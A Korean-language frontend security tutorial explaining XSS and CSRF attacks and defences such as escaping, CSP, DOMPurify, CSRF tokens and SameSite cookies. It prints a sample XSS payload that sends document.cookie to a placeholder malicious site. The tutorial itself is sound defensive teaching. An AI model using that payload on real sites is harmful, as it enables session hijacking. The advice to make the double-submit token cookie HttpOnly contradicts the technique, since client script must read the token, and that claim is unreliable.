# 1. 프론트엔드 주요 보안 이슈, XSS와 CSRF

프론트엔드 개발에서 보안은 간과하기 쉬운 영역이지만, 웹 애플리케이션의 안전성과 사용자 데이터를 보호하기 위해 필수적인 요소이다. 특히 크로스 사이트 스크립팅(XSS)과 교차 사이트 요청 위조(CSRF)는 프론트엔드에서 자주 발생하는 주요 취약점으로, 각각 브라우저와 웹사이트 간의 신뢰 관계를 악용한다는 공통점이 있다.

XSS는 "브라우저가 웹 사이트를 신뢰해서 생기는 취약점"이다. 사용자가 입력한 악성 스크립트가 브라우저에서 실행되면서, 사용자 세션 하이재킹이나 민감한 데이터 유출을 초래할 수 있다. 반면, CSRF는 "웹 사이트가 브라우저를 신뢰해서 생기는 취약점"이다. 공격자는 사용자가 인지하지 못한 상태에서 악의적인 요청을 웹 사이트로 전송하게 만들어, 사용자의 의도와 무관한 데이터 변경이나 작업이 이루어지도록 한다.

# 2. 크로스 사이트 스크립팅 (XSS)

## 2.1. XSS란?

크로스 사이트 스크립팅(XSS)은 웹 애플리케이션 보안에서 가장 흔하게 발견되는 취약점 중 하나로, 사용자 입력에 대한 적절한 검증 및 필터링이 부족할 때 발생한다. XSS는 웹 페이지에 삽입된 악성 스크립트가 브라우저에서 실행되도록 하여, 공격자가 사용자에게 부적절한 콘텐츠를 표시하거나, 사용자 권한을 가로채는 등의 악의적인 행동을 가능하게 한다. XSS는 주로 사용자가 신뢰하는 웹 사이트가 공격자의 악성 스크립트를 그대로 실행하도록 만드는 데 기인한다.

## 2.2. XSS의 공격 예시

XSS 공격은 사용자가 방문한 웹사이트에서 악성 스크립트를 실행시키는 방식으로 이루어진다. 예를 들어, 공격자가 XSS 취약점이 존재하는 블로그에 게시글이나 댓글을 작성하면서 <script>alert('해킹됨');</script>와 같은 스크립트를 삽입했다고 가정해보자. 이 경우, 다른 사용자가 해당 페이지를 방문할 때 이 스크립트가 브라우저에서 실행되어 경고 창이 표시된다. 이 단순한 예시는 공격자가 악성 코드를 사용하여 웹사이트에서 무엇이든 실행할 수 있음을 보여준다.

또 다른 예로, 한 쇼핑몰 사이트에서 리뷰 작성 기능이 있다고 가정해보자. 공격자가 리뷰 작성란에 <script>document.location='악성사이트?cookie='+document.cookie</script>와 같은 코드를 삽입한다면, 이 리뷰를 읽는 사용자의 세션 쿠키가 공격자의 사이트로 전송된다. 이 세션 쿠키를 통해 공격자는 사용자의 인증된 세션을 도용하여, 사용자의 계정에 접근하거나, 악의적인 행위를 할 수 있게 된다. 이러한 공격은 웹 애플리케이션에서 입력 데이터를 제대로 검증하지 않았을 때 발생할 수 있는 위험을 잘 보여준다.

## 2.3. XSS의 영향

XSS는 다양한 방식으로 웹 애플리케이션과 사용자의 보안을 위협한다. 가장 심각한 문제는 세션 하이재킹이다. 공격자는 사용자의 세션 쿠키를 가로채어, 사용자가 로그인한 상태를 도용할 수 있다. 이를 통해 공격자는 사용자의 권한을 무단으로 획득하여, 민감한 데이터에 접근하거나, 계정을 임의로 조작할 수 있다.

또한, XSS를 이용해 사용자의 브라우저에서 악성 코드를 실행함으로써 사용자의 시스템에 직접적인 피해를 줄 수도 있다. 예를 들어, 공격자는 XSS를 통해 키로거(Keylogger)나 피싱 공격을 실행하는 스크립트를 삽입할 수 있다. 이러한 스크립트는 사용자가 입력하는 모든 키 입력을 기록하거나, 사용자로 하여금 가짜 로그인 페이지에 로그인하도록 유도하여 자격 증명을 탈취할 수 있다.

또한, XSS는 웹 애플리케이션의 신뢰도를 심각하게 저하시킬 수 있다. 공격자가 웹 사이트에 악성 콘텐츠를 삽입하면, 사용자는 해당 사이트를 신뢰하지 않게 되고, 이는 사이트의 평판에 큰 영향을 미친다. XSS는 단순히 기술적인 문제가 아니라, 사용자와 웹 애플리케이션 간의 신뢰 관계를 훼손하는 심각한 보안 위협으로 작용한다. 이러한 이유로 XSS는 모든 웹 개발자가 반드시 이해하고, 방어해야 하는 중요한 보안 이슈이다.

## 2.4. XSS 취약점 대책

### 1. 입력 데이터의 검증

사용자 입력 데이터의 검증은 XSS 방지를 위한 가장 중요한 단계 중 하나이다. 웹 애플리케이션은 모든 사용자 입력을 신뢰해서는 안 되며, 입력된 데이터가 악의적인 의도를 가지고 있을 가능성을 항상 염두에 두어야 한다. 따라서, 모든 사용자 입력은 반드시 철저하게 검증되고, 필터링되어야 한다.

첫 번째로, 사용자 입력을 HTML 콘텐츠에 직접 삽입하기 전에 특수 문자를 이스케이프 처리해야 한다. 이는 <, >, &, ", ' 등의 특수 문자가 HTML 태그나 속성으로 인식되는 것을 방지하기 위한 조치이다. 이러한 문자가 변환되지 않고 그대로 브라우저에 전달되면, 공격자가 삽입한 스크립트가 그대로 실행될 수 있기 때문이다. 예를 들어, <script> 태그와 같은 입력이 그대로 HTML에 삽입되면, 브라우저는 이를 스크립트로 인식하고 실행하게 된다. 이스케이프 처리를 통해 이러한 입력은 단순한 텍스트로 변환되어, 스크립트가 실행되지 않게 된다.

또한, 입력 데이터의 길이와 유형을 제한하는 것도 중요하다. 예를 들어, 이메일 주소나 전화번호와 같이 명확한 형식이 필요한 입력의 경우, 정규 표현식을 사용해 입력된 데이터가 기대하는 형식에 맞는지 검증할 수 있다. 이렇게 함으로써, 공격자가 의도적으로 악성 코드를 입력하는 것을 사전에 차단할 수 있다. 또한, 필요 이상으로 긴 입력을 허용하지 않음으로써, 악의적인 스크립트가 대규모로 삽입되는 것을 방지할 수 있다.

마지막으로, 서버와 클라이언트 측에서 모두 검증을 수행하는 것이 바람직하다. 클라이언트 측 검증은 사용자 경험을 개선하고 빠른 피드백을 제공할 수 있지만, 이를 우회하는 방법이 존재하기 때문에 서버 측에서도 반드시 추가 검증이 이루어져야 한다. 서버 측 검증은 최종 방어선으로서, 클라이언트 측에서 처리되지 않은 악성 입력이 서버에 도달하는 것을 막아줄 수 있다. 이를 통해 잠재적인 XSS 공격의 위험을 최소화할 수 있다.

### 2. HTML 요소 속성의 보호

HTML 요소 속성에 사용자 데이터를 삽입할 때는 특별한 주의가 필요하다. 속성 값에 사용자 입력이 직접 삽입될 경우, 이는 XSS 공격에 노출될 수 있는 경로가 된다. 예를 들어, 사용자가 입력한 데이터가 href, src, title 등의 속성 값으로 사용될 때, 이 데이터를 반드시 따옴표로 감싸고, 이스케이프 처리를 통해 특수 문자가 코드로 실행되지 않도록 해야 한다. 이를 통해 공격자가 악의적인 스크립트를 삽입하는 것을 효과적으로 방지할 수 있다.

특히 href 속성의 경우, 사용자가 입력한 URL이 http:나 https:로 시작하는지 확인해야 한다. 이를 통해 javascript:와 같은 악성 스키마가 사용되지 않도록 할 수 있다. 속성 값에 삽입되는 모든 입력 데이터는 신뢰할 수 없는 사용자로부터 입력된 것이므로, 철저한 검증과 필터링이 필요하다.

### 3. DOM 조작 보호

DOM 조작 시에도 XSS 공격에 대한 방어가 중요하다. 사용자의 입력을 동적으로 HTML 요소에 삽입할 때, innerHTML과 같은 메서드는 가능한 한 사용하지 않아야 한다. 이 메서드는 입력된 HTML 코드가 그대로 파싱되어 실행되기 때문에, 악의적인 스크립트가 포함될 수 있다. 대신, appendChild, textContent, createElement 등의 메서드를 사용해 DOM을 조작하는 것이 안전하다.

이러한 메서드는 입력된 데이터를 단순한 텍스트로 처리하거나, 요소를 명확하게 생성해 삽입하기 때문에, 공격자가 악성 스크립트를 주입하는 것을 방지할 수 있다. 또한, DOM 조작 과정에서 사용자 입력이 HTML 속성에 들어가는 경우, 반드시 앞서 언급한 대로 이스케이프 처리와 검증을 수행해야 한다. 이렇게 하면 동적으로 생성된 콘텐츠도 안전하게 렌더링할 수 있다.

### 4. Content Security Policy(CSP) 적용

Content Security Policy(CSP)는 XSS와 같은 공격을 방지하기 위한 강력한 보안 메커니즘이다. CSP는 웹 애플리케이션이 실행할 수 있는 콘텐츠의 출처를 제어하여, 악의적인 스크립트가 브라우저에서 실행되는 것을 차단한다. 이를 통해 개발자는 자신이 신뢰하는 출처에서만 스크립트를 불러올 수 있도록 제한할 수 있으며, 인라인 스크립트나 외부 소스에서 로드되는 스크립트의 실행을 막을 수 있다.

CSP를 적용할 때는 'unsafe-inline'과 같은 비안전한 지시자를 사용하지 않는 것이 중요하다. 대신 nonce-source나 hash-source를 사용하여 인라인 스크립트가 허용될 때도 안전하게 실행되도록 설정할 수 있다. 또한, 특정 리소스 유형에 대해 script-src, style-src, img-src 등의 지시자를 설정하여, 신뢰할 수 있는 출처에서만 해당 리소스를 로드하게끔 제어할 수 있다. 이를 통해 XSS를 포함한 다양한 코드 인젝션 공격을 예방할 수 있다.

CSP는 테스트와 모니터링을 통해 지속적으로 개선되어야 한다. 초기에는 'Report-Only' 모드를 사용하여 CSP 설정이 제대로 작동하는지 확인하고, 문제점을 파악한 후에 실제 정책을 적용하는 것이 좋다. 또한, CSP는 설정 후에도 공격 시도가 발생할 경우 보고서를 수집하여, 새로운 위협에 대응할 수 있도록 지속적으로 관리해야 한다. 이렇게 함으로써, 웹 애플리케이션의 보안을 한층 강화할 수 있다.

### 5. XSS 예방 라이브러리 사용

XSS를 효과적으로 방어하기 위해서는 검증된 라이브러리를 사용하는 것이 중요하다. DOMPurify와 같은 라이브러리는 사용자가 입력한 데이터를 철저히 필터링하여, 잠재적으로 위험한 HTML 태그와 속성을 제거함으로써 XSS 공격을 방지한다. 이 라이브러리는 사용하기 간편하면서도 강력한 보호 기능을 제공하여, 개발자가 안전하게 사용자 콘텐츠를 처리할 수 있도록 돕는다.

DOMPurify는 다양한 설정 옵션을 제공하여 개발자가 애플리케이션의 요구에 맞게 필터링 규칙을 커스터마이즈할 수 있다. 예를 들어, 특정 태그나 속성만 허용하거나, 스크립트와 같이 악성 코드가 포함될 수 있는 요소를 완전히 제거하는 식으로 설정할 수 있다. 이를 통해 애플리케이션의 보안 수준을 높이고, 사용자가 악의적인 입력을 통해 시스템에 해를 끼치는 것을 방지할 수 있다.

최신 웹 브라우저에서 제공하는 Sanitizer API를 활용하는 것도 좋은 방법이다. Sanitizer API는 브라우저 내장 보안 기능으로, XSS와 같은 보안 위협으로부터 사용자를 보호하기 위해 고안되었다. 이 API는 브라우저 레벨에서 콘텐츠를 안전하게 처리하며, 사용자 입력을 DOM에 삽입하기 전에 자동으로 검증한다. 이러한 도구를 활용하면, 개발자는 XSS와 같은 취약점을 보다 효과적으로 방어할 수 있다.

# 3. 교차 사이트 요청 위조 (CSRF)

## 3.1. CSRF란?

교차 사이트 요청 위조(CSRF)는 사용자가 신뢰하는 웹사이트에 대해, 사용자의 의도와는 다른 악의적인 요청을 수행하도록 유도하는 공격 기법이다. 이 공격은 사용자가 웹사이트에 이미 로그인된 상태에서 발생하며, 공격자가 사용자의 브라우저를 통해 웹사이트로 요청을 전송하게 만들어 서버가 이를 정상적인 요청으로 처리하도록 만든다. 결과적으로, 서버는 이러한 요청을 신뢰된 사용자로부터 온 것이라 간주하고, 사용자의 권한 하에 민감한 작업을 수행하게 된다.

CSRF 공격은 웹사이트가 사용자의 브라우저를 신뢰하는 점을 악용한다. 예를 들어, 사용자가 인터넷 뱅킹에 로그인한 상태에서 공격자가 준비한 악성 웹 페이지를 방문하면, 그 페이지는 사용자의 브라우저를 통해 이체 요청을 자동으로 전송할 수 있다. 이 과정에서 사용자는 자신의 계좌에서 돈이 이체된다는 사실을 전혀 인지하지 못한다. 이러한 공격은 사용자가 특정한 행동을 취하지 않더라도, 단순히 악성 페이지를 방문하거나, 공격자가 만든 링크를 클릭하는 것만으로도 실행될 수 있다.

## 3.2. CSRF의 공격 예시

CSRF 공격의 한 예시는 사용자가 이미 로그인된 상태에서 특정 웹사이트의 악성 링크를 클릭하는 상황이다. 예를 들어, 공격자는 사용자가 자주 방문하는 포럼에 악성 링크를 게시할 수 있다. 이 링크는 사용자가 클릭하는 즉시, 그의 브라우저를 통해 인터넷 뱅킹 사이트에 자동 이체 요청을 보낸다. 사용자는 이 요청이 자신도 모르게 실행되었기 때문에, 자신의 계좌에서 자금이 이체되는 사실을 알지 못한다. 이처럼 CSRF 공격은 사용자의 인증 상태를 악용하여 의도하지 않은 작업을 수행하게 만든다.

또 다른 예시로는, 공격자가 조작한 이메일 링크를 통해 CSRF를 실행하는 경우가 있다. 사용자가 링크를 클릭하면, 해당 링크는 사용자가 로그인된 상태인 전자 상거래 사이트에서 자동으로 주문을 생성하거나, 배송 주소를 변경하는 요청을 보낸다. 사용자는 이러한 변경 사항을 인지하지 못하고, 주문이 잘못된 주소로 배송되는 등 큰 피해를 입을 수 있다. 이러한 공격은 사용자가 자신의 브라우저에서 실행되는 모든 요청을 신뢰할 수 없다는 점을 명확히 보여준다.

## 3.3. CSRF의 영향

CSRF는 사용자의 개인 정보와 자산을 심각하게 위협할 수 있는 취약점이다. 공격자는 CSRF를 통해 사용자가 의도하지 않은 작업을 수행하게 만들 수 있으며, 이는 웹 애플리케이션의 기능과 데이터 무결성에 큰 영향을 미친다. 예를 들어, 금융 서비스에서 CSRF 공격이 발생할 경우, 사용자의 자금이 무단으로 이체되거나, 중요한 계좌 정보가 변경될 수 있다. 이러한 피해는 경제적인 손실로 직결될 뿐만 아니라, 사용자의 신뢰를 완전히 잃게 만드는 원인이 된다.

또한, CSRF는 소셜 미디어나 이메일 서비스에서도 큰 영향을 미칠 수 있다. 공격자는 CSRF를 통해 사용자의 계정으로 무단 게시물을 작성하거나, 사용자 모르게 비밀번호를 변경하여 계정을 탈취할 수 있다. 이로 인해 사용자는 자신의 온라인 정체성을 잃거나, 원치 않는 콘텐츠가 자신의 이름으로 퍼지게 되는 상황에 직면할 수 있다. 이러한 결과는 단순히 개인적인 피해를 넘어서, 사회적 신뢰와 평판에도 심각한 영향을 미친다. CSRF의 피해는 눈에 보이지 않게 누적되며, 문제를 인지한 후에는 이미 큰 피해가 발생한 경우가 많아, 이에 대한 예방이 무엇보다 중요하다.

## 3.4. CSRF 취약점 대책

### 1. CSRF 토큰 사용

CSRF 방어의 핵심 전략 중 하나는 원타임 토큰(One-Time Token)을 활용하여 요청과 서버 간의 일치 여부를 검증하는 것이다. 이 토큰은 서버가 사용자 세션에 고유하게 생성한 값으로, 각 요청마다 포함되어야 한다. 서버는 요청을 처리하기 전에 이 토큰이 유효한지 확인한다. 이를 통해 서버는 요청이 사용자의 브라우저에서 직접 발생했는지, 또는 외부에서 조작된 것인지를 검증할 수 있다.

CSRF 토큰은 주로 폼에 숨김 필드로 포함된다. 사용자가 폼을 제출하면, 토큰이 함께 전송되어 서버에서 검증된다. 이렇게 함으로써 공격자가 외부에서 동일한 요청을 모방하더라도, 유효한 토큰이 없으면 요청이 처리되지 않는다. 이는 사용자가 정상적인 경로를 통해 요청을 보냈는지를 확인하는 중요한 보안 절차이다.

이 토큰은 단순한 값이 아니라, 복잡하고 예측 불가능한 값이어야 하며, 매 세션마다 변경되는 것이 바람직하다. 세션이 시작될 때마다 새로운 토큰이 생성되거나, 각 요청 시마다 새롭게 발급되어야 한다. 이렇게 하면 공격자가 특정 토큰을 획득하더라도 이를 재사용할 수 없게 되어, CSRF 공격의 성공 가능성을 크게 낮출 수 있다. 이는 CSRF 공격을 방지하는 데 있어 중요한 보안 계층을 추가하는 역할을 한다.화할 수 있다.

### 2. SameSite Cookie 속성 사용

CSRF 공격을 방지하는 또 다른 중요한 방법은 쿠키의 SameSite 속성을 사용하는 것이다. 이 속성은 쿠키가 요청과 함께 전송되는 방식을 제어하여, 교차 사이트 요청이 쿠키를 포함할 수 없도록 제한한다. SameSite 속성은 Lax, Strict, 또는 None으로 설정할 수 있으며, 기본적으로는 Lax로 설정하여 대부분의 경우에 안전한 보호를 제공한다.

SameSite=Lax는 사용자가 링크를 클릭하거나 GET 요청을 통해 사이트를 탐색할 때 쿠키가 전송되도록 허용하지만, POST 요청과 같은 민감한 작업에는 쿠키가 포함되지 않도록 한다. 이는 사용자가 외부 사이트에서 특정 링크를 클릭하는 일반적인 사용 사례를 보호하면서도, CSRF 공격의 가능성을 줄이는 데 효과적이다. SameSite=Strict로 설정하면, 모든 외부 요청에 대해 쿠키가 전송되지 않아, CSRF 공격에 대한 보호가 더욱 강화된다.

하지만, SameSite=Strict는 사용자 경험에 영향을 미칠 수 있어, 모든 상황에서 적합하지는 않다. 반면, SameSite=Lax는 보안과 사용자 경험의 균형을 잘 맞추는 옵션으로, 대부분의 웹 애플리케이션에서 권장된다. 특정 상황에서는 SameSite=None을 사용하여 쿠키가 교차 사이트 요청에서도 전송되도록 설정할 수 있지만, 이 경우 반드시 Secure 속성도 함께 사용하여 HTTPS 연결에서만 쿠키가 전송되도록 해야 한다. 이를 통해 CSRF 공격에 대한 강력한 방어를 유지하면서도, 필요한 경우 유연성을 제공할 수 있다.

### 3. Double Submit Cookie 기법

Double Submit Cookie 기법은 CSRF 공격을 방어하기 위한 효과적인 방법 중 하나로, CSRF 토큰을 두 번 제출하는 방식을 사용한다. 이 기법에서는 서버가 사용자의 브라우저에 CSRF 토큰을 포함하는 쿠키를 발급하고, 클라이언트는 이 토큰을 폼 데이터나 요청 헤더에 포함시켜 서버에 다시 전송한다. 서버는 요청이 들어오면, 쿠키에 저장된 토큰과 폼이나 헤더에 포함된 토큰이 일치하는지 확인한다.

이 방법은 서버가 CSRF 토큰을 관리하는 방식과 달리, 쿠키와 폼 데이터 간의 일치 여부를 검사하여 CSRF 공격을 방어한다. 공격자는 CSRF 토큰이 포함된 쿠키를 위조할 수 없으며, 일치하는 토큰 값을 알지 못하기 때문에, 이 기법은 CSRF 공격을 효과적으로 차단한다. 또한, 이 기법은 서버 측에서 특별한 상태 정보를 유지할 필요가 없어 구현이 비교적 간단하다.

하지만 Double Submit Cookie 기법은 쿠키의 보안 설정이 중요하다. 쿠키가 JavaScript에서 접근 가능하지 않도록 HttpOnly 속성을 사용해야 하며, Secure 속성을 통해 HTTPS 연결에서만 쿠키가 전송되도록 설정해야 한다. 이러한 보안 설정을 통해 쿠키가 클라이언트 측에서 노출되는 것을 방지하고, CSRF 공격에 대한 방어력을 더욱 강화할 수 있다.

### 4. 출처 검증

 CSRF 공격을 방지하는 또 다른 중요한 방법은 출처 검증(Origin Verification)이다. 출처 검증은 서버가 요청의 출처(Origin)와 Referer 헤더를 확인하여, 요청이 신뢰할 수 있는 출처에서 온 것인지 판단하는 방식이다. 웹 브라우저는 요청을 보낼 때 출처와 Referer 헤더를 자동으로 포함시키며, 서버는 이를 바탕으로 요청의 유효성을 검사할 수 있다.

출처 검증은 특히 중요한 작업에서 유용하다. 예를 들어, 민감한 데이터 수정이나 결제 요청과 같은 작업에서 출처가 올바른지 확인함으로써, 외부 사이트에서 발생한 의도하지 않은 요청을 차단할 수 있다. 이 방법은 CSRF 공격을 사전에 방어하는 강력한 수단이 된다.

이 방식의 핵심은, 서버가 허가된 출처 리스트를 유지하고, 그 리스트에 포함되지 않은 출처에서 온 요청은 모두 거부하는 것이다. 이를 통해, 공격자가 임의의 사이트에서 보내는 CSRF 요청이 효과를 발휘하지 못하도록 막을 수 있다. 그러나, Referer 헤더는 일부 환경에서 제거되거나 수정될 수 있으므로, 출처 검증은 CSRF 방어 전략의 하나로 사용되며, 다른 방법들과 함께 적용하는 것이 권장된다.
